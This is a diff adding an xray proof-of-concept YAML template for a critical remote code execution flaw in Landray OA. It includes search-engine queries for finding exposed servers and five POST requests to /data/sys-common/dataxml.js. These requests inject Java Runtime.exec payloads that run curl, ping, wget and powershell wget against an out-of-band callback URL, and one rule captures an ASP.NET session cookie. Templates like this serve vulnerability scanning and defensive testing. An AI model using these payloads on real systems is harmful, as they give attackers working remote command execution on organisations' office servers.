@@ -1,0 +1,77 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Landray-OA系统"
+    hunter-query: app.name="Landray 蓝凌OA"
+    quake-query: favicon:"302464c3f6207d57240649926cfc7bd4"
+    zoomeye-query: app:"蓝凌数字OA"
+    threatbook-query: 
+    cve: 
+    cnvd:
+    tips:
+    
+name: poc-yaml-xray-poc-Landray-dataxml.js-rce
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST                                         
+            path: /data/sys-common/dataxml.js
+            headers:
+              Content-Type: application/x-www-form-urlencoded
+            body: s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("curl {{reverseURL}}");
+        expression: response.status == 200 &&  response.body_string.contains("校验通过") && reverse.wait(5)
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /data/sys-common/dataxml.js
+            headers:                                                          
+              Content-Type: application/x-www-form-urlencoded
+            body: s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("ping -c 2 {{reverseURL}}");
+        expression: response.status == 200 &&  response.body_string.contains("校验通过") && reverse.wait(5)
+
+        output:
+          search: |-
+            "ASP.NET_SessionId=(?<token>\\w*)".bsubmatch(response.raw_header)
+          token: search["token"]
+    r2:
+        request:
+            cache: true
+            method: POST
+            path: /data/sys-common/dataxml.js
+            headers:                                                          
+              Content-Type: application/x-www-form-urlencoded
+            body: s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("ping -n 2 {{reverseURL}}");
+        expression: response.status == 200 &&  response.body_string.contains("校验通过") && reverse.wait(5)
+    r3:
+        request:
+            cache: true
+            method: POST
+            path: /data/sys-common/dataxml.js
+            headers:
+              Content-Type: application/x-www-form-urlencoded
+            body: s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("wget -P /tmp/ {{reverseURL}}");
+        expression: response.status == 200 &&  response.body_string.contains("校验通过") && reverse.wait(5)
+
+    r4:
+        request:
+            cache: true
+            method: POST
+            path: /data/sys-common/dataxml.js
+            headers:
+              Content-Type: application/x-www-form-urlencoded
+            body: s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("cmd /c powershell.exe wget -uri {{reverseURL}}");
+        expression: response.status == 200 &&  response.body_string.contains("校验通过") && reverse.wait(5)
+
+expression: r0() || r1() || r2() || r3() || r4()
